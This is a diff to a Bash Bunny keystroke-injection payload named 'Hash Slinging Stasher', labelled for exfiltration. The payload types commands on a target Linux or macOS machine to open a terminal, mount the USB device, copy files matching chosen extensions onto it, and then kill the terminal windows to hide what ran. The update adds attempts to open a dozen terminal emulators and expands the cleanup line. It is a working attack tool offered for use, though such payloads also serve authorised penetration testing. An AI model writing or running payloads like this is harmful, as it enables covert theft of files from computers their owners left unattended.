@@ -1,9 +1,9 @@
 # Title:         Hash Slinging Stasher for Bash Bunny
 # Description:   Copies files to Bash Bunny udisk from the target OS matching given extensions and file size only if their checksum does not appear in a user defined or generated checksum list, and appends the checksum of copied files to that list.
 # Author:        theSW4n
-# Version:       1.0
+# Version:       1.1
 # Category:      Exfiltration
-# Target:        Tested on Ubuntu 22.04.3 LTS, MacOS 13.x, and Kali Linux 2023.3 (not compatible with Windows)
+# Target:        Tested on MacOS 13.x/14.0, Ubuntu 22.04.3 LTS, Manjaro 23.0.4, and Kali Linux 2023.3 (not compatible with Windows)
 # Attackmodes:   HID, Storage
 
 # Options
@@ -32,12 +32,66 @@ QUACK GUI
 QUACK STRING "terminal"
 QUACK ENTER
 QUACK DELAY 1500
-QUACK STRING "xterm"
+QUACK STRING "qterminal"
 QUACK ENTER
-QUACK DELAY 1500
+QUACK DELAY 500
 QUACK STRING "n"
 QUACK ENTER
-QUACK DELAY 1500
+QUACK DELAY 500
+QUACK STRING "gnome-terminal"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING "n"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING "xterm"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING "n"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING "konsole"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING "n"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING "lxterminal"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING "n"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING "urxvt"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING "n"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING "st"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING "n"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING "alacritty"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING "n"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING "xfce4-terminal"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING "n"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING "tilda"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING "n"
+QUACK ENTER
+QUACK DELAY 500
 QUACK STRING "udisksctl mount -b /dev/disk/by-label/`ls /dev/disk/by-label/ | grep -i BashBunny`"
 QUACK ENTER
 QUACK DELAY 1500
@@ -79,7 +133,7 @@ QUACK DELAY 1500
 QUACK STRING "diskutil eject \$(mount | grep -i BashBunny | cut -d ' ' -f 3)"
 QUACK ENTER
 QUACK DELAY 2000
-QUACK STRING "killall qterminal & killall Terminal & killall gnome-terminal- &  killall konsole & killall xterm"
+QUACK STRING "killall qterminal & killall gnome-terminal- & killall Terminal & killall xterm & killall konsole & killall lxterminal & killall urxvt & killall st & killall alacritty & killall xfce4-terminal & killall tilda"
 QUACK ENTER
 sync
 
